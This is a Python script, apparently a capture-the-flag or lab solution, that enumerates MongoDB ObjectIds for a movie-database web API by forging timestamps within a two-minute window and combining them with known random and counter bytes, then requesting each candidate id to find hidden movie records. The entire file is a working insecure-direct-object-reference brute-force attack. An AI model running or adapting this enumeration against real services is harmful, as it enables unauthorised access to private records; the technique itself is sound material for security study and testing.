from datetime import datetime
from colorama import Fore, Style, init
import requests
import time
import random

'''
id = 110211229278400787

time1 = id >> 16

epoch = 0

#print(datetime.fromtimestamp(time1 / 1000 + epoch / 1000))

'''
'''
hexT = 0x6444dbc4
intT = int(hexT)
print(intT)
print(datetime.fromtimestamp(intT))
# 6444dbc4 869e32bbc4 647ddc
tm = '2023-04-23 09:18:28'
print(hex(int(datetime.strptime(tm, '%Y-%m-%d %H:%M:%S').timestamp())).replace('0x',''))
'''


init()
host = 'https://moviedb-pn3ez3zthv57y.hexbirch.com/'
five_bytes_random_value_per_process = 'a955a0cb5d'
two_bytes_from_random_ID = '647d'
number_of_potential_films = 0
list_of_found_movies = []
start = time.time()
rand = (random.randint(50, 150) / 1000)
try:
    for i in range(18, 20):
        for j in range(27, 60):
            for k in range(208, 256):
                number_of_potential_films += 1
                forged_datetime = f'2023-04-23 09:{i}:{j}'
                forged_datetime_obj = datetime.strptime(forged_datetime, '%Y-%m-%d %H:%M:%S')
                timestamp = forged_datetime_obj.timestamp()
                timestamp2hex = hex(int(timestamp)).replace('0x', '')
                bf = hex(k).replace('0x', '')
                forged_mongodb = f'{timestamp2hex}{five_bytes_random_value_per_process}{two_bytes_from_random_ID}{bf}'
                response = requests.get(f'{host}/api/movie?genre=action&movie_id='
                                        f'{forged_mongodb}')
                response_json = response.json()
                if 'error' in response_json:
                    pass
                   # print("Movie not found " + Fore.RED + forged_mongodb + Fore.BLUE + " - ["
                   #       + str(number_of_potential_films) + "]" + Style.RESET_ALL)
                else:
                    title = response_json['title']
                    print("Movie was found " + Fore.GREEN + forged_mongodb + Fore.YELLOW + " - ["
                          + str(number_of_potential_films) + "] " + Fore.MAGENTA + title + Style.RESET_ALL)
                    list_of_found_movies.append(forged_mongodb)
                time.sleep(rand)
except Exception as e:
    print(e)
end = time.time()
print(list_of_found_movies)
print("Execution time: ", (end - start) * (10 ** 3) / 1000, "seconds")
